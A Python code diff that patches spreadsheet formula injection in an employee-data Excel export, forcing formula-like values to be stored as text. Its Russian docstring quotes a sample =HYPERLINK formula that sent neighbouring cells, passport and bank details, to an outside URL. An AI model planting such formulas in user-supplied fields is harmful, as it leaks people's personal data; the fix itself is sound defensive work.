@@ -75,6 +75,25 @@ def _employee_to_template_row(emp) -> dict:
     }
 
 
+_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _text_cell(ws, row: int, column: int, value):
+    """Записать значение ТЕКСТОМ, даже если оно похоже на формулу.
+
+    openpyxl превращает строку на «=» в формулу. Значения в выгрузке вписывает
+    сам сотрудник (должность, телефон, адрес, реквизиты через PUT /me), и
+    `=HYPERLINK("https://…?d="&J2&K2;…)` в ячейке отправлял наружу соседние
+    ячейки — паспорта и реквизиты всех сотрудников из выгрузки админа
+    (до 27.10.2026). Тип «строка» оставляет текст как есть: «+7 (999)…»
+    остаётся телефоном, без апострофа в начале.
+    """
+    cell = ws.cell(row=row, column=column, value=value)
+    if isinstance(value, str) and value.startswith(_FORMULA_START):
+        cell.data_type = "s"
+    return cell
+
+
 def _build_template_xlsx(rows: list, positions: list, with_example: bool) -> bytes:
     wb = Workbook()
     ws = wb.active
@@ -110,7 +129,7 @@ def _build_template_xlsx(rows: list, positions: list, with_example: bool) -> byt
     if clean_pos:
         lst = wb.create_sheet('Списки')
         for i, p in enumerate(clean_pos, start=1):
-            lst.cell(row=i, column=1, value=p)
+            _text_cell(lst, i, 1, p)
         lst.sheet_state = 'hidden'
         dv_pos = DataValidation(type='list', formula1=f'Списки!$A$1:$A${len(clean_pos)}', allow_blank=True)
         dv_pos.promptTitle = 'Должность'
@@ -132,13 +151,13 @@ def _build_template_xlsx(rows: list, positions: list, with_example: bool) -> byt
                    '+7 (999) 123-45-67', '@ivanov', '08.06.2026', 'г. Москва, ул. Ленина 1',
                    '4509 123456', 'Карта', '2200 1234 5678 9010']
         for i, v in enumerate(example, start=1):
-            cc = ws.cell(row=r, column=i, value=v)
+            cc = _text_cell(ws, r, i, v)
             cc.font = ex_font
             cc.border = border
         r += 1
     for row in rows:
         for i, h in enumerate(TEMPLATE_HEADERS, start=1):
-            ws.cell(row=r, column=i, value=row.get(h, ''))
+            _text_cell(ws, r, i, row.get(h, ''))
         r += 1
 
     ins = wb.create_sheet('Инструкция')
